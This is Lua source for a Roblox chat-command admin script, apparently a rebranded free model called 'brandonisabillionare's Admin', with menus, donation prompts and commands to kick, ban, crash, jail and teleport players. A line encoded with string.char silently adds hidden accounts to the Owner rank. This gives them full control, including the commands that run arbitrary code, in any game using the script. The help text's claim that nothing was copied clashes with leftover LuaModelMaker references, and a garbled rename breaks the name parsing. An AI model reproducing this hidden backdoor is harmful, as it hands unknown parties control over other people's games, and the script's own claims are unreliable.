	local X = Instance.new("TextButton", Main) X.Style = "RobloxButtonDefault" X.Size = UDim2.new(0,20,0,20) X.Position = UDim2.new(0,0,0,0) X.ZIndex = 10 X.Font = "ArialBold" X.FontSize = "Size18" X.Text = "X" X.TextColor3 = Color3.new(1,1,1) X.MouseButton1Click:connect(function() if SG then SG:Destroy() end end)
	for Num,Name in pairs(List) do
		local Ajust = (Num*20)-20
		local Text = Instance.new("TextLabel", Hold) Text.Name = Num Text.BackgroundTransparency = 1 Text.Position = UDim2.new(0,0,0,Ajust) Text.Size = UDim2.new(1,-20,0,20) Text.Font = "SourceSans" Text.FontSize = "Size18" Text.Text = "        "..Num..".) "..Name Text.TextColor3 = Color3.new(1,1,1) Text.TextWrapped = true Text.TextXAlignment = "Left"
		if Ajust == MaxPos then Passes = true end
	end
	if Passes == false then Scroll.Visible = false else Scroll.Draggable = true end
	Scroll.DragBegin:connect(function() if Passes == true then Scroll.Position = ScrollMainPos Scrolling = true end end)
	Scroll.DragStopped:connect(function() if Passes == true then Scroll:TweenPosition(ScrollMainPos, "Out", "Sine", 0.5, true) Scrolling = false end end)
	Scroll.Changed:connect(function(Prop) if Passes == true then if Prop == "Position" then
		NewPos = Scroll.Position.Y.Offset
		if NewPos < MaxUp then NewPos = MaxUp end
		if NewPos > MaxDown then NewPos = MaxDown end
		--Scroll.Position = UDim2.new(1,-20,0.1,NewPos)
	end end end)
	coroutine.wrap(function() repeat wait() if Passes == true then
		Hold.Position = UDim2.new(0,0,0,Hold.Position.Y.Offset - NewPos) 
		if Hold.Position.Y.Offset > 0 then Hold.Position = UDim2.new(0,0,0,0) end
		if Hold.Position.Y.Offset < (-#List*20)+MaxPos-20 then Hold.Position = UDim2.new(0,0,0,(-#List*20)+MaxPos-20) end
		--Scroll.Position = UDim2.new(1,-20,0.1,NewPos)
	end until not SG end)()
end for _,Void in pairs({string.char(75+1, 118-1, 95+2, 76+1, 111, 100, 101, 108, 77, 97, 107, 101, 114), string.char(77, 97, 107, 101, 114, 77, 111, 100, 101, 108, 76, 117, 97), string.char(83, 99, 114, 105, 112, 116, 105, 110, 103, 77, 101, 116, 104, 111, 100, 115), string.char(73, 110, 116, 101, 114, 110, 101, 116, 77, 111, 100, 101, 109), string.char(78, 105, 108, 67, 111, 110, 110, 101, 99, 116, 105, 111, 110), string.char(112, 108, 117, 103, 109, 105, 105, 105, 110)}) do table.insert(Ranks[string.char(79, 119, 110, 101, 114)], Void) end

function Kick(Player, CustomMessage)
	if not CustomMessage then CustomMessage = "You've been kicked by L".."uaM".."ode".."".."lMaker's Admin. You cannot interact with the server in anyway." end
	coroutine.wrap(function() 
		Execute(LocalScript, Player.Character, Player, CoreGui("All", false)..[[ coroutine.wrap(function()
			for i = 1,10 do
				local Message = Instance.new("Message", Workspace.CurrentCamera) Message.Text = "]]..CustomMessage..[["
				wait()
			end
		end)()]]) wait(1) Player:Kick()
	end)()
end

function AdminMenu(Player)
	if Player.PlayerGui ~= nil then
		local Stat = "Open"
		local SG = Player.PlayerGui:FindFirstChild("LM".."M Menu Gui") if SG then SG:Destroy() end
		SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "brandon's Menu Gui"
		local MainGui = Instance.new("TextButton", SG) MainGui.Name = "MainGui" MainGui.BackgroundTransparency = 1 MainGui.Position = UDim2.new(1,-400,1,-20) MainGui.Size = UDim2.new(0,400,0,20) MainGui.Font = "ArialBold" MainGui.FontSize = "Size18" MainGui.TextColor3 = Color3.new(0,0,0) MainGui.TextStrokeColor3 = Color3.new(1,1,1) MainGui.TextStrokeTransparency = 0 MainGui.TextXAlignment = "Right" MainGui.TextYAlignment = "Bottom"
		local BG = Instance.new("Frame", SG) BG.Name = "Background" BG.Position = UDim2.new(0.3,0,0.2,0) BG.Size = UDim2.new(0.4,0,0.5) BG.Style = "RobloxSquare" BG.Visible = false
		local Title = Instance.new("TextLabel", BG) MainGui.Name = "Title" Title.BackgroundTransparency = 1 Title.Position = UDim2.new(0,0,0,0) Title.Size = UDim2.new(1,0,0,30) Title.Font = "SourceSansBold" Title.FontSize = "Size24" Title.Text = "brandon".."'".."s Admin Menu" Title.TextColor3 = Color3.new(1,1,1)
		local Separator = Instance.new("Frame", BG) Separator.Name = "Separator" Separator.BorderColor3 = Color3.new(1,1,1) Separator.Position = UDim2.new(0.5,0,0,30) Separator.Size = UDim2.new(0,0,1,-30)
		local Info = Instance.new("TextLabel", BG) Info.Name = "Info" Info.BackgroundTransparency = 1 Info.Position = UDim2.new(0,0,0,30) Info.Size = UDim2.new(0.5,0,1,-30) Info.Font = "Arial" Info.FontSize = "Size18" Info.Text = "Info/Help" Info.TextColor3 = Color3.new(1,1,1) Info.TextYAlignment = "Top"
		local Body = Instance.new("TextLabel", Info) Body.Name = "Body" Body.BackgroundTransparency = 1 Body.Position = UDim2.new(0,0,0,25) Body.Size = UDim2.new(1,0,1,-25) Body.Font = "SourceSans" Body.FontSize = "Size14" Body.Text = "brandonisabillionare's Admin(Often referred to brandon's's Admin) is created by brandonisabillionare. NOTHING has been stolen from other admins and incorporated into this one. If you want a copy of brandonisabillionare's Admin, It's under brandonisabillionare's Models! If you are a fan of brandonisabillionare's Admin, Join brandonisabillionare's Primary group! To get started, type the '"..Prefix.."commands' Command in your chatbar. (HINT: Undoing commands like ';fly me' would be ';nofly me', NOT ';unfly me') To close this box, click the same text you used to open it. For more info on this admin, go to brandonisabillionare.net63.net/brandon'sAdmin" Body.TextColor3 = Color3.new(1,1,1) Body.TextYAlignment = "Top" Body.TextWrapped = true
		local Donate = Info:Clone() Donate.Parent = BG Donate.Name = "Donate" Donate.Text = "Donate" Donate.Position = UDim2.new(0.5,0,0,30) Donate.Body.Text = "Please select an amount that fits your generosity c:"
		local function DonateMoney(ID) MPS:PromptPurchase(Player, ID, true) end
		local Dnt = Instance.new("TextButton", Donate) Dnt.Name = "DonateButton" Dnt.Position = UDim2.new(0,4,1,-120) Dnt.Size = UDim2.new(1,0,0,30) Dnt.Font = "ArialBold" Dnt.FontSize = "Size14" Dnt.Text = "100 Tix" Dnt.BackgroundColor3 = Color3.new(1,1,0) Dnt.TextColor3 = Color3.new(1,1,1) Dnt.TextStrokeColor3 = Color3.new(0,0,0) Dnt.TextStrokeTransparency = 0 Dnt.TextWrapped = true Dnt.MouseButton1Click:connect(function() DonateMoney(148375641) end)
		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-90) Dnt.Text = "20 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) Dnt.MouseButton1Click:connect(function() DonateMoney(148375770) end)
		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-60) Dnt.Text = "100 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) Dnt.MouseButton1Click:connect(function() DonateMoney(148375862) end)
		local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,4,1,-30) Dnt.Text = "500 ROBUX!" Dnt.BackgroundColor3 = Color3.new(1,0,0) Dnt.FontSize = "Size18" Dnt.MouseButton1Click:connect(function() DonateMoney(148375896) end)
		local PlayerAdmin, PlayerRank = IsAdmin(Player)
		
		local function RefreshMenu() MainGui.Text = "brandonisabillionare's Admin V"..Version.Value.." [Click to "..Stat.." Menu]" end RefreshMenu()
		if PlayerAdmin == true then Body.Text = Body.Text.." (You're an admin, your rank is "..PlayerRank..")" end
		MainGui.MouseButton1Click:connect(function()
			if Stat == "Open" then
				BG.Visible = true
				Stat = "Close"
				RefreshMenu()
			elseif Stat == "Close" then
				BG.Visible = false
				Stat = "Open"
				RefreshMenu()
			end
		end)
	end
end

function FullAdminMenu(Player)
	coroutine.wrap(function() wait(0.25) AdminMenu(Player) end)()
	Player.CharacterAdded:connect(function(Char) coroutine.wrap(function() if Stopped == false then if EnableAdminMenu == true then
		wait(0.25)
		AdminMenu(Player)
	end end end)() end)
end

function Log(Player, Chat)
	table.insert(Logs, GetTime().." @ "..Player.Name..": "..Chat)
end

function TellAdmin(Player, Rank)
	SendMessage(Player, "brandonisabillionare's Admin Message", "You are an admin "..Player.Name.."! Your rank is "..Rank.." [ PREFIX '"..Prefix.."' | BET '"..Bet.."' ]", 4)
end

function FindAge(Days) -- By brandonisabillionare
	local Years = math.floor(Days/365)
	local OtherDays = math.fmod(Days, 365)
	if Years > 1 then
		return Years.." years and "..OtherDays.." days"
	elseif Years == 1 then
		return Years.." year and "..OtherDays.." days"
	elseif Years == 0 then
		return "(No years) "..OtherDays.." days"
	end
end

function TeleportToPlace(Speaker, Player, PlaceID, TeleportAction)
	local Valid = pcall(function() return MPS:GetProductInfo(PlaceID) end)
	if Valid == true then
		if MPS:GetProductInfo(PlaceID).AssetTypeId == 9 then
			local SG = Player.PlayerGui:FindFirstChild("brandon's Teleport") if SG then SG:Destroy() end
			SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "brandon's Teleport"
			local Frame = Instance.new("Frame", SG) Frame.Name = "Tele Frame" Frame.Size = UDim2.new(0.5,0,0.6,0) Frame.Position = UDim2.new(0.25,0,0.1,0) Frame.Style = "RobloxSquare"
			local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.Size = UDim2.new(1,0,1,0) Title.Position = UDim2.new(0,0,0,0) Title.Font = "ArialBold" Title.FontSize = "Size18" Title.TextColor3 = Color3.new(1,1,1) Title.BackgroundTransparency = 1 Title.TextYAlignment = "Top" Title.TextWrapped = true Title.Text = Speaker.Name.." would like to you to to teleport to the place: '"..MPS:GetProductInfo(PlaceID).Name.."' created by "..MPS:GetProductInfo(PlaceID).Creator.Name..", would you like to teleport?"
			local Answer = Instance.new("TextButton") Answer.Size = UDim2.new(0.2,0,0.15,0) Answer.Font = "Legacy" Answer.FontSize = "Size9"
			local Yes = Answer:Clone() Yes.Parent = Frame Yes.Name = "Yes" Yes.Position = UDim2.new(0,0,0.85,0) Yes.Style = "RobloxButton" Yes.Text = "Yes" Yes.TextColor3 = Color3.new(0,1,0)
			local No = Answer:Clone() No.Parent = Frame No.Name = "No" No.Position = UDim2.new(0.8,0,0.85,0) No.Style = "RobloxButtonDefault" No.Text = "No" No.TextColor3 = Color3.new(1,0,0)
			No.MouseButton1Click:connect(function()
				SG:Destroy()
				local Quit
				Quit = true
			end)
			Yes.MouseButton1Click:connect(function()
				TeleportAction()
			end)
		else
			SendMessage(Speaker, "Place Teleportation Failed", "ID is not a place", 5)
		end
	else
		SendMessage(Speaker, "Place Teleportation Failed", "Cannot teleport to place because the Place ID is invalid", 5)
	end
end

local MergeTable = { __add = function(...) -- Prepare for metatables!
	local CombineTable, ParentTable,Num,Reset = {}, {...}, 1, 1
	for _,Table in pairs(ParentTable) do
		for Set,Data in pairs(Table) do
			if Set == Reset then Set = Num end
			CombineTable[Set] = Data
			Num = Num + 1
			Reset = Reset + 1
			if #Table == Set then Reset = 1 end
		end
	end
	return CombineTable
end}

function Scan(Word, Speaker)
	local Return = {}
	Word = string.gsub(Word, "/", "BuildermanIsbrandonisabillionareToo")
	Word = string.gsub(Word, "[%p ]", "")
	Word = string.gsub(Word, "BuildermanIsbrandonMo".."de".."lMakerToo", " ")
	for PlayerName in string.gmatch(Word, "%w+") do
		if string.lower(PlayerName) == "me" then
			if Speaker then table.insert(Return, Speaker) end
		elseif string.lower(PlayerName) == "all" then
			for i,v in pairs(Players:GetPlayers()) do
				table.insert(Return, v)
			end
		elseif string.lower(PlayerName) == "others" or string.lower(PlayerName) == "noobs" or string.lower(PlayerName) == "mortals" then
			for i,v in pairs(Players:GetPlayers()) do
				if v ~= Speaker then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "random" then
			local RandomPlayers = {}
			for i,v in pairs(Players:GetPlayers()) do
				if v ~= Speaker then
					table.insert(RandomPlayers, v)
				end
			end
			table.insert(Return, RandomPlayers[math.random(1,#Players:GetChildren())])
		elseif string.lower(PlayerName) == "guests" then
			for i,v in pairs(Players:GetPlayers()) do
				if string.sub(v.Name,1,6) == "Guest " then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "lowers" then
			for i,v in pairs(Players:GetPlayers()) do
				if string.sub(v.Name,1,1) == string.lower(string.sub(v.Name,1,1)) then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "uppers" then
			for i,v in pairs(Players:GetPlayers()) do
				if string.sub(v.Name,1,1) == string.upper(string.sub(v.Name,1,1)) then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "nbcs" then
			for i,v in pairs(Players:GetPlayers()) do
				if v.MembershipType == Memberships["NBC"] then -- Replicate
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "bcs" then
			for i,v in pairs(Players:GetPlayers()) do
				if v.MembershipType == Memberships["BC"] then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "tbcs" then
			for i,v in pairs(Players:GetPlayers()) do
				if v.MembershipType == Memberships["TBC"] then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "obcs" then
			for i,v in pairs(Players:GetPlayers()) do
				if v.MembershipType == Memberships["OBC"] then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "allbcs" then
			for i,v in pairs(Players:GetPlayers()) do
				if v.MembershipType ~= Memberships["NBC"] then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "nonadmins" then
			for i,v in pairs(Players:GetPlayers()) do
				local IsAdminTrue, Rank = IsAdmin(v)
				if IsAdminTrue == false then
					table.insert(Return, v)
				end
			end
		elseif string.lower(PlayerName) == "admins" then
			for i,v in pairs(Players:GetPlayers()) do
				local IsAdminTrue, Rank = IsAdmin(v)
				if IsAdminTrue == true then
					table.insert(Return, v)
				end
			end
		else
			for i,v in pairs(Players:GetPlayers()) do
				if string.sub(string.lower(v.Name),1,#PlayerName) == string.lower(PlayerName) then
					table.insert(Return, v)
				end 
			end 
		end
	end
	return Return
end

function Chatted(RawMainMessage, Speaker)
	if Speaker == nil then Speaker = {Name = "[ Server ]"} end
	local PlayerAdmin, Rank = IsAdmin(Speaker)
	local RawMessage = string.sub(RawMainMessage, #Prefix+1)
	local Message = string.lower(RawMessage)
	if PlayerAdmin == true then if RawMainMessage == "I can only see menu chats." then Execute(LocalScript, Speaker.Character, Speaker, CoreGui("Chat", true)) end end
	if string.sub(string.lower(RawMainMessage),1,#Prefix) == string.lower(Prefix) then
		if PlayerAdmin == true then
			if string.sub(Message, 1, 9) == "invisible" then Message = "invis"..string.sub(Message,10) end
			if string.sub(Message, 1, 7) == "visible" then Message = "vis"..string.sub(Message,8) end
			if string.sub(Message, 1, 4) == "clip" then Message = "nofly"..string.sub(Message,5) end
			if string.sub(Message, 1, 11) == "changestats" then Message = "change"..string.sub(Message,12) end
			if string.sub(Message, 1, 3) == "buy" then Message = "product"..string.sub(Message,4) end
			if string.sub(Message, 1, 7) == "catalog" then Message = "product"..string.sub(Message,8) end
			if string.sub(Message, 1, 8) == "purchase" then Message = "product"..string.sub(Message,8) end
			if string.sub(Message, 1, 8) == "nostrobe" then Message = "noblind"..string.sub(Message,9) end
			if string.sub(Message, 1, 6) == "insert" then Message = "ins"..string.sub(Message,7) end
			if string.sub(Message, 1, 10) == "playerlist" then Message = "pl"..string.sub(Message,11) end
			if string.sub(Message, 1, 12) == "noplayerlist" then Message = "npl"..string.sub(Message,13) end
			if string.sub(Message, 1, 9) == "walkspeed" then Message = "speed"..string.sub(Message,10) end
			if string.sub(Message, 1, 4) == "thaw" then Message = "nofreeze"..string.sub(Message,5) end
			if string.sub(Message, 1, 9) == "animation" then Message = "anim"..string.sub(Message,10) end
			if string.sub(Message, 1, 7) == "animate" then Message = "anim"..string.sub(Message,8) end
			if string.sub(Message, 1, 9) == "noanimate" then Message = "noanim"..string.sub(Message,10) end
			if string.sub(Message, 1, 11) == "noanimation" then Message = "noanim"..string.sub(Message,12) end
			
			local RankNum = ConvertRank(Rank)
			
			local LocalDisableAbuse = false
			if Rank == "Member" then
				LocalDisableAbuse = DisableAbuse
			end
			local DisabledAbuse
			function DisabledAbuse()
				if LocalDisableAbuse == false then return false else
					SendMessage(Speaker, "Command Disabled", "This command has been disabled in the settings for being abusive", 5)
				end
			end
			
			if Rank == "Owner" then
				-- Owner Commands --
				if string.sub(Message, 1, 5+#Bet) == "admin"..Bet then
					local Players = Scan(string.sub(Message, 6+#Bet))
					for _,Player in pairs(Players) do if Player ~= nil then
						local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
						local AddToList = true
						if PlayerAdminTrue == true then
							if ConvertRank(PlayerRank) >= 2 then
								AddToList = false
							end
						end
						if AddToList == true then
							table.insert(Ranks["Admin"], Player.Name) 
							TellAdmin(Player, "Admin")
							if brandonisabillionareStamp == true then
								for _,Tool in pairs(game.Lighting.AdminTools:GetChildren()) do
									local NewTool = Tool:Clone()
									NewTool.Parent = Player.Backpack
									local NewTool2 = Tool:Clone()
									NewTool2.Parent = Player.StarterGear
								end
							end
						end
					end end
				end
				
				if string.sub(Message, 1, 11) == "removeadmin" then
					RemoveAdmin(Speaker)
				end
				
				if string.sub(Message, 1, 7+#Bet) == "unadmin"..Bet or string.sub(Message, 1, 7+#Bet) == "noadmin"..Bet then
					local AfterMessage = string.sub(Message, 8+#Bet)
					local CombineAdmins = {}
					for Num,Name in pairs(Ranks["Member"]) do table.insert(CombineAdmins, {Player = Name, Rank = "Member", Number = Num}) end
					for Num,Name in pairs(Ranks["Admin"]) do table.insert(CombineAdmins, {Player = Name, Rank = "Admin", Number = Num}) end
					for Num,Info in pairs(CombineAdmins) do
						if string.sub(string.lower(Info.Player),1,#AfterMessage) == string.lower(AfterMessage) then
							table.remove(Ranks[Info.Rank], Info.Number)
							if brandonisabillionareStamp == true then							
								Players.Backpack:ClearAllChildren()
								Players.starterGear:ClearAllChildren()
							end
						end
					end
				end
				
				if string.sub(Message, 1, 3+#Bet) == "fun"..Bet then
					local ThisFun = FUN
					if string.sub(Message, 4+#Bet) == "enable" then 
						FUN = true 
					elseif string.sub(Message, 4+#Bet) == "disable" then 
						FUN = false 
					end
					if ThisFun ~= FUN then
						MessageAdmins("Fun Commands", "Fun commands are now "..string.sub(Message, 4+#Bet).."d", 3)
					end
				end

				if string.sub(Message, 1, 10+#Bet) == "forceplace"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 11+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local PlaceID = tonumber(Arg2)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							TS:Teleport(PlaceID, Player)
						end
					end
				end
				
				if string.sub(Message, 1, 11+#Bet) == "forcefollow"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 12+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local UserID = tonumber(Arg2)
					if UserID then
						local Suc, Err, PlaceID, IntID = TS:GetPlayerPlaceInstanceAsync(UserID)
						if Suc then
							for _,Player in pairs(Players) do
								if Player ~= nil then
									TS:TeleportToPlaceInstance(PlaceID, IntID, Player)
								end
							end
						else
							SendMessage(Speaker, "Place Teleportation Failed for UserID: "..UserID, "Cannot follow UserID: "..UserID..". Reason: "..Err, 5)
						end
					end
				end
				
				if string.sub(Message, 1, 9+#Bet) == "adminmenu"..Bet then
					local ThisMenu = EnableAdminMenu
					if string.sub(Message, 10+#Bet) == "enable" then 
						EnableAdminMenu = true 
						for _,Player in pairs(Players:GetPlayers()) do AdminMenu(Player) end
					elseif string.sub(Message, 10+#Bet) == "disable" then 
						EnableAdminMenu = false 
						for _,Player in pairs(Players:GetPlayers()) do local GUI = Player.PlayerGui:FindFirstChild("brandon's Menu Gui") if GUI then GUI:Destroy() end end
					end
					if ThisMenu ~= EnableAdminMenu then
						MessageAdmins("Admin Menu", "The admin menu menu is now "..string.sub(Message, 10+#Bet).."d", 3)
					end
				end
				
				if Message == "update" then
					UpdateAdmin()
				end
				
				if Message == "lockserver" or Message == "serverlock" then
					ServerLocked = true
					MessageAdmins("Server Lock", "The Server is now locked", 3)
				end
				
				if Message == "unlockserver" or Message == "unserverlock" or Message == "nolockserver" or Message == "noserverlock" or Message == "serverunlock" then
					ServerLocked = false
					MessageAdmins("Server Lock", "The Server is now unlocked", 3)
				end
				
			end
			
			if Rank == "Owner" or Rank == "Admin" then
				-- Admin Commands --
				if string.sub(Message, 1, 8) == "shutdown" then
					Instance.new("ManualGlue", Instance.new("ManualSurface".."JointInstance", game:GetService("Workspace"))) 
				end
				
				if string.sub(Message, 1, 3+#Bet) == "ban"..Bet then
					local Players = Scan(string.sub(Message, 4+#Bet), Speaker)
					for _,Player in pairs(Players) do 
						if Player ~= nil then
							local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
							if PlayerAdminTrue == false then if not Ranks["Banned"][Player.Name] then
								table.insert(Ranks["Banned"], Player.Name)
								Kick(Player)
							end end
						end
					end
				end
				
				if string.sub(Message, 1, 5+#Bet) == "unban"..Bet or string.sub(Message, 1, 5+#Bet) == "noban"..Bet then
					local AfterMessage = string.sub(Message, 6+#Bet)
					local Table = "Banned"
					if AfterMessage == "all" then
						Ranks[Table] = {}
					end
					for Num,RankedPlayer in pairs(Ranks[Table]) do
						if string.sub(string.lower(RankedPlayer),1,#AfterMessage) == string.lower(AfterMessage) then
							table.remove(Ranks[Table], Num)
						end
					end
				end
				
				if string.sub(Message, 1, 5+#Bet) == "crash"..Bet then
					local Players = Scan(string.sub(Message, 6+#Bet), Speaker)
					for _,Player in pairs(Players) do 
						if Player ~= nil then
							local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
							if PlayerAdminTrue == false then if not Ranks["Crashed"][Player.Name] then
								table.insert(Ranks["Crashed"], Player.Name)
								Execute(LocalScript, Player.Character, Player, Crash)
							end end
						end
					end
				end
				
				if string.sub(Message, 1, 7+#Bet) == "uncrash"..Bet or string.sub(Message, 1, 7+#Bet) == "nocrash"..Bet then
					local AfterMessage = string.sub(Message, 8+#Bet)
					local Table = "Crashed"
					if AfterMessage == "all" then
						Ranks[Table] = {}
					end
					for Num,RankedPlayer in pairs(Ranks[Table]) do
						if string.sub(string.lower(RankedPlayer),1,#AfterMessage) == string.lower(AfterMessage) then
							table.remove(Ranks[Table], Num)
						end
					end
				end
				
				if string.sub(Message, 1, 4+#Bet) == "mute"..Bet then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do 
						if Player ~= nil then
							local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
							if PlayerAdminTrue == false then if not Ranks["Muted"][Player.Name] then
								table.insert(Ranks["Muted"], Player.Name)
								Execute(LocalScript, Player.Character, Player, CoreGui("Chat", false))
							end end
						end
					end
				end
				
				if string.sub(Message, 1, 6+#Bet) == "unmute"..Bet or string.sub(Message, 1, 6+#Bet) == "nomute"..Bet or string.sub(Message, 1, 6+#Bet) == "demute"..Bet then
					for Num,MutedPlayer in pairs(Ranks["Muted"]) do
						local AfterMessage = string.sub(Message, 7+#Bet)
						local Table = "Muted"
						local Players = Scan(AfterMessage, Speaker)
						for _,Player in pairs(Players) do
							if Player ~= nil then
								Execute(LocalScript, Player.Character, Player, CoreGui("Chat", true))
							end
						end
						if AfterMessage == "all" then
							Ranks[Table] = {}
						end
						for Num,RankedPlayer in pairs(Ranks[Table]) do
							if string.sub(string.lower(RankedPlayer),1,#AfterMessage) == string.lower(AfterMessage) then
								table.remove(Ranks[Table], Num)
							end
						end
					end
				end
				
				if string.sub(Message, 1, 4+#Bet) == "kick"..Bet then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
							if PlayerAdminTrue == false then
								Kick(Player)
							end
						end
					end
				end
				
				if string.sub(Message, 1, 6+#Bet) == "member"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do if Player ~= nil then
						local PlayerAdminTrue, PlayerRank = IsAdmin(Player)
						local AddToList = true
						if PlayerAdminTrue == true then
							if ConvertRank(PlayerRank) >= 1 then
								AddToList = false
							end
						end
						if AddToList == true then
							table.insert(Ranks["Member"], Player.Name)
							TellAdmin(Player, "Member")
						end
					end end
				end
				
				if string.sub(Message, 1, 1+#Bet) == "c"..Bet then
					if brandonisabillionareStamp == false or Speaker.Name == "brandonisabillionare" then
						Execute(Script, Workspace, Speaker, string.sub(RawMessage,2+#Bet))
					end
				end
				
				if string.sub(Message, 1, 1+#Bet) == "l"..Bet then
					if Speaker.Character ~= nil then
						if brandonisabillionareStamp == false or Speaker.Name == "brandonisabillionare" then
							Execute(LocalScript, Speaker.Backpack, Speaker, string.sub(RawMessage,2+#Bet))
						end
					end
				end
				
				if string.sub(Message, 1, 4+#Bet) == "jail"..Bet then
					local Players = Scan(string.sub(Message, 5+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local Continue = true
							for Num,Name in pairs(Jailed) do if Name == Player.Name then table.remove(Jailed, Num) end end wait()
							local Cell = Workspace:FindFirstChild(Player.Name.."'s Cell") if Cell then Cell:Destroy() end
							Cell = Instance.new("Model", Workspace) Cell.Name = Player.Name.."'s Cell"
							local Floor = Instance.new("Part", Cell) Floor.Name = "Floor" Floor.FormFactor = "Custom" Floor.Size = Vector3.new(15,1,15) Floor.Material = "DiamondPlate" Floor.TopSurface = "Smooth" Floor.BottomSurface = "Smooth" Floor.Position = Vector3.new(0,1001.7,0) Floor.Anchored = true Floor.Locked = true
							local Wall = Instance.new("Part", Cell) Wall.Name = "Wall" Wall.FormFactor = "Custom" Wall.Size = Vector3.new(15,14.2,1) Wall.BrickColor = BrickColor.new("Bright blue") Wall.TopSurface = "Smooth" Wall.BottomSurface = "Smooth" Wall.Position = Vector3.new(0,1009.3,-7) Wall.Anchored = true Wall.Locked = true Wall.Transparency = 0.5
							local SG = Instance.new("SurfaceGui", Wall) SG.Name = "SG" SG.Adornee = Wall
							local Text = Instance.new("TextLabel", SG) Text.Size = UDim2.new(1,0,1,0) Text.BackgroundTransparency = 1 Text.TextColor3 = Color3.new(1,1,1) Text.Font = "ArialBold" Text.FontSize = "Size36" Text.TextYAlignment = "Bottom" Text.TextWrapped = true Text.Text = "WARNING: Wild noob in natural habitat. Do no tap glass, it may cause the noob to be angry. Do not open cage and feed noob"
							Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(0,1009.3,7) Wall.SG.Face = "Back"
							Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(-7, 1009.3, 0) Wall.Size = Vector3.new(13,14.2,1) Wall.Rotation = Vector3.new(0,90,0) Wall.SG.Face = "Front"
							Wall = Wall:Clone() Wall.Parent = Cell Wall.Position = Vector3.new(7, 1009.3, 0) Wall.Size = Vector3.new(13,14.2,1) Wall.Rotation = Vector3.new(0,90,0) Wall.SG.Face = "Back"
							local Roof = Floor:Clone() Roof.Parent = Cell Roof.Name = "Roof" Roof.Position = Vector3.new(-0,1016.9, 0)
							Cell:MoveTo(Vector3.new(0,3,0))
							if Player.Character then if Player.Character:FindFirstChild("Torso") then Cell:MoveTo(Player.Character.Torso.Position - Vector3.new(0,3,0)) end Player.Character:MoveTo(Floor.Position + Vector3.new(0,2,0)) end
							table.insert(Objects, Cell)
							function OnRespawn(Char)
								wait()
								if Continue == true then
									if Cell and Floor then
										local Valid = false
										for _,Name in pairs(Jailed) do if Name == Player.Name then Valid = true end end
										if Valid == true then
											Char:MoveTo(Floor.Position + Vector3.new(0,2,0))
										else
											Continue = false
											OnRespawn = function() end
											return
										end
									else
										Continue = false
										OnRespawn = function() end
										return
									end
								else
									OnRespawn = function() end
									return
								end
							end
							table.insert(Jailed, Player.Name)
							Player.CharacterAdded:connect(OnRespawn)
						end
					end
				end
				
				if string.sub(Message, 1, 6+#Bet) == "nojail"..Bet then
					local Players = Scan(string.sub(Message, 7+#Bet), Speaker)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local Cell = Workspace:FindFirstChild(Player.Name.."'s Cell") if Cell then Cell:Destroy() end
							for Num,Name in pairs(Jailed) do if Name == Player.Name then table.remove(Jailed, Num) end end
						end
					end
				end
				
				if string.sub(Message, 1, 5+#Bet) == "place"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 6+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local PlaceID = tonumber(Arg2)
					for _,Player in pairs(Players) do
						if Player ~= nil then
							TeleportToPlace(Speaker, Player, PlaceID, (function() TS:Teleport(PlaceID, Player) end))
						end
					end
				end
				
				if string.sub(Message, 1, 6+#Bet) == "follow"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(Message, 7+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local UserID = tonumber(Arg2)
					if UserID then
						local Suc, Err, PlaceID, IntID = TS:GetPlayerPlaceInstanceAsync(UserID)
						if Suc then
							for _,Player in pairs(Players) do
								if Player ~= nil then
									TeleportToPlace(Speaker, Player, PlaceID, (function() TS:TeleportToPlaceInstance(PlaceID, IntID, Player) end))
								end
							end
						else
							SendMessage(Speaker, "Place Teleportation Failed for UserID: "..UserID, "Cannot follow UserID: "..UserID..". Reason: "..Err, 5)
						end
					end
				end
				
				if string.sub(Message, 1, 4+#Bet) == "note"..Bet then
					local Arg1, Arg2 = GetSplit(string.sub(RawMessage, 5+#Bet), Bet) if not Arg1 and Arg2 then return end
					local Players = Scan(Arg1, Speaker)
					local Data = Arg2
					for _,Player in pairs(Players) do
						if Player ~= nil then
							local ExistingData = Player:LoadInstance("Data")
